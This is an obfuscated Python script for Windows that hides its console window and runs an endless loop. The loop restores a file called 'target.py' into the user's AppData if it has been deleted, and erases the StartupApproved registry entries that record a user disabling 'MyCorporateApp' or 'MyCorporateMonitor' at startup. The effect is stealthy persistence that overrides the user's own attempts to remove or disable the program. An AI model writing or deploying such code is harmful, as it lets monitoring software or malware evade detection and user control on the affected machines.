import os as _Q5r9M2t3J7k1V_
import sys as _S8v3K9p2T4m7Q_
import winreg as _W4n9T2k3V8p1R_
import shutil as _H7q2P9v4K3m8T_
import time as _R3t9P7v2M6k1N_

_F7N2Q9K3T8V4_dispatch = {}

def _R8T3P2V9K4M1_(_n, _f): _F7N2Q9K3T8V4_dispatch[_n] = _f

def _Z9K3Q7V2X8M4P1T6N2_(_r):
    def _N5T2P9R3V7K1_():
        if hasattr(_S8v3K9p2T4m7Q_, '_MEIPASS'):
            return _Q5r9M2t3J7k1V_.path.join(_S8v3K9p2T4m7Q_._MEIPASS, _r)
        return _r
    return _N5T2P9R3V7K1_()
_R8T3P2V9K4M1_('get_resource_path', _Z9K3Q7V2X8M4P1T6N2_)

def _C4V9T3K2P8M7Q1N5_():
    def _J7K2P9V3T8M4Q1N6_():
        _r5K9V2T3P8M7_key = r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"
        _e2T9K4V8P3M7_names = ["MyCorporateApp", "MyCorporateMonitor"]
        try:
            _k6T3P9V2K8M4_ = _W4n9T2k3V8p1R_.OpenKey(_W4n9T2k3V8p1R_.HKEY_CURRENT_USER, _r5K9V2T3P8M7_key, 0, _W4n9T2k3V8p1R_.KEY_ALL_ACCESS)
            for _n in _e2T9K4V8P3M7_names:
                try:
                    _W4n9T2k3V8p1R_.DeleteValue(_k6T3P9V2K8M4_, _n)
                except FileNotFoundError:
                    pass
                except Exception:
                    pass
            _W4n9T2k3V8p1R_.CloseKey(_k6T3P9V2K8M4_)
        except Exception:
            pass
    return _J7K2P9V3T8M4Q1N6_()
_R8T3P2V9K4M1_('remove_old_registry_entries', _C4V9T3K2P8M7Q1N5_)

def _X7Q2P9V4K3T8M1N6_():
    def _F5K9T2V3P8M7Q1N4_():
        _t6K3V9P2T8M7_dir = _Q5r9M2t3J7k1V_.path.expanduser("~/AppData/Roaming/MyCorporateApp")
        _p4K9V2T3M8Q7_path = _Q5r9M2t3J7k1V_.path.join(_t6K3V9P2T8M7_dir, "target.py")
        if not _Q5r9M2t3J7k1V_.path.exists(_p4K9V2T3M8Q7_path):
            try:
                _Q5r9M2t3J7k1V_.makedirs(_t6K3V9P2T8M7_dir, exist_ok=True)
                _s3K9V2T8P7M4_source = _F7N2Q9K3T8V4_dispatch['get_resource_path']("target.py")
                if not _Q5r9M2t3J7k1V_.path.exists(_s3K9V2T8P7M4_source):
                    return False
                _H7q2P9v4K3m8T_.copy2(_s3K9V2T8P7M4_source, _p4K9V2T3M8Q7_path)
            except Exception:
                return False
        return True
    return _F5K9T2V3P8M7Q1N4_()
_R8T3P2V9K4M1_('check_and_restore_target', _X7Q2P9V4K3T8M1N6_)

def _R2T9P4K3V8M7_main():
    def _N3K7Q2P9V4T8M1_():
        if hasattr(_S8v3K9p2T4m7Q_, 'frozen'):
            import ctypes as _C9T3K7V2P8M4Q_
            _C9T3K7V2P8M4Q_.windll.user32.ShowWindow(_C9T3K7V2P8M4Q_.windll.kernel32.GetConsoleWindow(), 0)
        while True:
            _F7N2Q9K3T8V4_dispatch['check_and_restore_target']()
            _F7N2Q9K3T8V4_dispatch['remove_old_registry_entries']()
            _R3t9P7v2M6k1N_.sleep(60)
    return _N3K7Q2P9V4T8M1_()

if __name__ == '__main__':
    _R2T9P4K3V8M7_main()()